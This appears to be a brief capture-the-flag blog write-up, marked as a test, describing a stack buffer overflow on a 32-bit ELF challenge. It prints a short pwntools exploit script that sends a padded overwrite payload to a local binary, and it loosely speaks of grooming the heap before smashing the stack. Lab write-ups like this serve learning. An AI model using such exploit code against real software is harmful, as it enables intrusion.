---
title: 'Pwn: Buffer Overflow 101'
description: 'How we got first blood on the easiest pwn challenge of the weekend.'
pubDate: '2026-03-04'
author: 'river'
---
this is a test btw
# The Challenge

We were given a 32-bit ELF binary and the `libc` library. Time to groom the heap. 

## The Exploit

Here is the Python script we used to smash the stack:

```python
from pwn import *

p = process('./vulnerable')
payload = b"A" * 64 + p32(0xdeadbeef)
p.sendline(payload)
p.interactive()
```
Flag secured: idk{sm4sh_th3_st4ck_f0r_fun_4nd_pr0f1t}
